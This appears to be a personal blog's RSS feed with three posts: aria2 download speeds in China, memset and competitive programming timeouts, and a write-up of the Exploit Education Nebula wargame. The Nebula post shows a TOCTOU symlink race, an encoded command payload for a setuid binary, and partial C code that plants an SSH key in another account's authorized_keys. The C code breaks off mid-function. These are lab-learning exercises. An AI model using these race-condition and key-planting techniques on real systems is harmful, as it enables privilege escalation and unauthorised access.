<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Zijun Hui</title>
    <description>Random thoughts and random solutions on computer science</description>
    <link>zijunh.github.io/</link>
    <atom:link href="zijunh.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 13 Feb 2020 15:18:49 +1100</pubDate>
    <lastBuildDate>Thu, 13 Feb 2020 15:18:49 +1100</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>aria2 assisted downloading in China</title>
        <description>&lt;p&gt;Those who have been to China are often frustrated by the restrictions imposed by the Great Fire Wall of China (GFW). Even though VPNs are available to bypass the restrictions, they are often very slow or unstable. However, even for foreign websites that are not blocked by the GFW, accessing them is extremely slow. This becomes extremely problematic when you need to download large files, such as software updates or other essential files. The slow speed of software updates can be remedied by changing mirror sites to those local to China. However, the file I needed was only hosted on 1 website. The speeds were painstakingly slow (often ~90kb/s), it would take hours to download a 1GB file, even when I have a bandwidth of 100MBps.&lt;/p&gt;

&lt;p&gt;To solve this problem, the idea of parallel downloading can be introduced. &lt;a href=&quot;https://github.com/aria2/aria2&quot;&gt;aria2&lt;/a&gt; is such a tool. It allows connection to single or multiple hosts from the same machine. This allows multiple connections to the same host to increase the download speed. Each connection downloads a chunk, and when a chunk is downloaded, a new connection is made to download the next chunk. “-s” specifies the number of connections to the hosts, “-k” specifies the size of each chunk, and “-x” specifies the maximum number of connections. The full documentation is &lt;a href=&quot;https://aria2.github.io/manual/en/html/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The arguments I used were:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aria2c.exe -x16 -s16 -k1M link
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note this method requires manually downloading the file. Perhaps manual interference can be omitted by writing a local proxy that automatically does this. However, I am not a network expert so this will be a task for the readers (or when I do become a network expert).&lt;/p&gt;
</description>
        <pubDate>Wed, 18 Dec 2019 20:31:24 +1100</pubDate>
        <link>zijunh.github.io/2019/12/china-download/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/12/china-download/</guid>
        
        <category>discussion</category>
        
        
        <category>random</category>
        
      </item>
    
      <item>
        <title>TLE and memset in competitive programming</title>
        <description>&lt;p&gt;Recently I was practicing competitive programming on &lt;a href=&quot;https://uva.onlinejudge.org/&quot;&gt;UVa’s online judge&lt;/a&gt;. I was doing question 1625 (context does not matter), and got TLE for a few submissions. For those that are unfamiliar, TLE is time limit error, where the program you wrote spent longer to solve the problem than the designated time. Searching online, there were few solutions. I restructured the code, but still got an error. After further digging, I found this &lt;a href=&quot;https://blog.csdn.net/wu_tongtong/article/details/78404494&quot;&gt;post&lt;/a&gt;, which details TLE for the same problem as well. It appears &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt; is the error! I was using &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt; to clear 2 arrays of ints with size 5000 * 5000 for each test case (total of 50 million ints, equating 200 million bytes). At the time, I did not consider the size of the memory required to clear. Anyway, after removing the &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt;, the program ran fine.&lt;/p&gt;

&lt;p&gt;Though now I may seem crazy to believe reseting 200MB of RAM takes insignificant time, it is what I thought at that time. Software engineering classes taught me to initialise your variables, even if they will be overwritten soon. Though most copmpetitive programming guides recommend using &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt; to clear arrays, I guess you really need to consider which arrays are necessary to clear. For those used for DP, clearly they are not required.&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Aug 2019 23:50:12 +1000</pubDate>
        <link>zijunh.github.io/2019/08/tle/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/08/tle/</guid>
        
        <category>competitive programming</category>
        
        <category>discussion</category>
        
        <category>optimisation</category>
        
        
        <category>random</category>
        
      </item>
    
      <item>
        <title>Exploit Education - Nebula: Write-up (Part 2)</title>
        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at &lt;a href=&quot;https://exploit.education/nebula/&quot;&gt;Exploit Education&lt;/a&gt;, a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.&lt;/p&gt;

&lt;p&gt;The main purpose of each level is to bypass certain restrictions imposed by the system, and run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; with the required privileges (pwn).&lt;/p&gt;

&lt;h2 id=&quot;level10&quot;&gt;Level10&lt;/h2&gt;

&lt;p&gt;Inspecting the home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;level10&lt;/code&gt;, one may find a curious file names “x”. Within the file, the password to the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag10&lt;/code&gt; account is stored. I assumed this was an unintended error as it would make this challenge boring. Thus, I ignored this file.&lt;/p&gt;

&lt;p&gt;The home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;flag10&lt;/code&gt; contains 2 files: a &lt;code class=&quot;highlighter-rouge&quot;&gt;token&lt;/code&gt; file, which we do not have read permissions, and an executable with its source code provided online.&lt;/p&gt;

&lt;p&gt;Inspecting the source code, the first thing I noticed was that the check by &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; is performed pre-maturely compared to the &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt;. The timing difference is exaggerated by the &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; to a socket, which is known to take a long time. This increases the chance of a race condition, where we can abuse this delay to bypass the initial check. This is confirmed by the &lt;a href=&quot;http://man7.org/linux/man-pages/man2/access.2.html&quot;&gt;man page for access&lt;/a&gt;, which specifies “…creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.”&lt;/p&gt;

&lt;p&gt;In order to abuse the delay, we can swap the contents of the files we want to check. Initially, it may be a normal file, but it can be swapped to a symbolic link to the target file “token”. This is done by the command &lt;code class=&quot;highlighter-rouge&quot;&gt;ln -fs /home/flag10/token foo.txt&lt;/code&gt;. As the socket is created on port 18211, a keep-alive socket listener is required; it can be created by &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat -kl 18211 &amp;amp;&amp;gt; out.txt &amp;amp;&lt;/code&gt;. The last “&amp;amp;” indicates it runs in the background. To abuse the race condition, 2 terminals will be needed: one to repeatedly run the “flag10” executable by &lt;code class=&quot;highlighter-rouge&quot;&gt;while :; do /home/flag10/flag10 foo.txt 127.0.0.1; done&lt;/code&gt;, and another to swap the original “foo.txt” to a symlink. We hope the timing is correct, and “out.txt” can be checked. If “out.txt” does not contain the required string, then the above process needs to be repeated.&lt;/p&gt;

&lt;p&gt;Personally, I got the desired string - “615a2ce1-b2b5-4c76-8eed-8aa5c4015c27” - on my second try.&lt;/p&gt;

&lt;h2 id=&quot;level11&quot;&gt;Level11&lt;/h2&gt;

&lt;p&gt;This level is rather interesting, as I suspect it is not performing as it is intended. Though I have devised a method that performs &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; successfully, it is rather convoluted compared to the most obvious method. That method does spawn a shell, but it has insufficient privileges.&lt;/p&gt;

&lt;p&gt;The level provides the source code for a binary with the “setuid” bit on.&lt;/p&gt;

&lt;h3 id=&quot;method-1&quot;&gt;Method 1&lt;/h3&gt;

&lt;p&gt;Inspecting the source code, it appears there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; call within the &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function. To trigger the &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function, the first line of input must start with “Content-Length: xxxx”, where “xxx” is a valid integer. Then, the integer is parsed, and an &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; function separates the program into 2 cases: one where the integer is smaller than 1024, and one where it is not. Interestingly, the case when the integer is smaller than 1024 only works when the integer is 1. This is indicated by the line &lt;code class=&quot;highlighter-rouge&quot;&gt;fread(buf, length, 1, stdin) != length&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;fread&lt;/code&gt; returns the number of elements read. The size of each element is indicated by the second argument and the number of each element is limited by hte third argument. As the third argument is “1”, the inequality will only hold true when the “length” is 1. With only 1 character under ur control, what I could have done is severely limited. Thus, I mainly focused on the second case.&lt;/p&gt;

&lt;p&gt;The second case occurs when the inputted integer is larger or equal to 1024. In that case, a random file is generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;getrand&lt;/code&gt; and the program essentially reads “length” number of characters from the buffer. The characters are then processed by the &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function and the message is executed by &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Reversing the process/encryption is rather simple, as we can use the fact that (a ^ b) ^ b == a. As &lt;code class=&quot;highlighter-rouge&quot;&gt;k&lt;/code&gt; changes after each character is processed, it is easy to reverse engineer it. After some math, the following python code was written to decrypt the code:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, we can manipulate the information that goes into &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;. I intended to have an input of “getflag\00”. The null terminator is required to finish the input. As a length of at least 1024 is required, the remaining bytes of the input can be padded by some junk character. This is summarised as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_function&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;getflag&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Length: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before executing, notice &lt;code class=&quot;highlighter-rouge&quot;&gt;getrand&lt;/code&gt; requires and environmental variable “TEMP”. This is often not set on the system, and I simply set it to “/tmp” by &lt;code class=&quot;highlighter-rouge&quot;&gt;export TEMP=/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;However, when it is executed, the program indicates we did not obtain the flag. Further inspection by &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; reveals that the effective uid was reverted to the original just before the system call.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level11@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python py.py | /home/flag11/flag11
blue &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1024, length &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1024, pink &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1024
getflag is executing on a non-flag account, this doesn&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;t count
level11@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python py.py | strace /home/flag11/flag11
...
getgid32&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1012
setgid32&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1012&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
getuid32&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1012
setuid32&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1012&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I believe this is an unintended error, as this essentially blocks out all attacks that utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;method-2&quot;&gt;Method 2&lt;/h3&gt;

&lt;p&gt;Fortunately, I have devised an alternative method. Observe the escalated permissions are only revoked just before the &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; call. Before that, another function that we can abuse is &lt;code class=&quot;highlighter-rouge&quot;&gt;write(fd, buf, pink)&lt;/code&gt;. Through “fd” is determined by the random generator &lt;code class=&quot;highlighter-rouge&quot;&gt;getrand&lt;/code&gt;, the file name that is generated can be estimated. It uses pid, which can be easily determined, and &lt;code class=&quot;highlighter-rouge&quot;&gt;time(NULL)&lt;/code&gt;, whose resolution is only to hte nearest second. I can then create the predicted file beforehand, and symlink it to a file I want to overwrite (or create).&lt;/p&gt;

&lt;p&gt;Now, I had to determine a target file to write. Looking around the home folder of “flag11”, I found a “.ssh” folder. There are 2 ways to connect using SSH: using a password or using an authorised key. Coincidentally, the authorised keys are stored in the “.ssh” folder’s “authorized_keys” files. Thus, if I can place the key of “level11” in the file, I can SSH into “flag11” without a password, and gain escalated privileges.&lt;/p&gt;

&lt;p&gt;To generate a key for “level11”, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen -t rsa&lt;/code&gt; with default values. This creates a “id_rsa.pub” file, which contains the required keys.&lt;/p&gt;

&lt;p&gt;To predict the temporary filename, I use the fact that 2 executables that run consecutively have a pid difference of 1 and the first executable will execute in less than 1 second given the program is simple and the machine is fast. Using the above 2 facts, I created the following C file that pre-creates a file and symlinks it to “/home/flag11/.ssh/authorized_keys”. Note that running this file will cause the executable to end pre-maturely as the required input length was not reached, but at this point the file contents have already been written so it does not matter. Replace &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; with whatever is in the “id_rsa.pub” file. In this case, encryption/processing is not needed as that is required for &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; only.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getrand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;srandom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TEMP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;asprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s/%d.%c%c%c%c%c%c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;sc&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
      &lt;span class=&quot;sc&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
      &lt;span class=&quot;sc&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define CL &quot;Content-Length: &quot;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
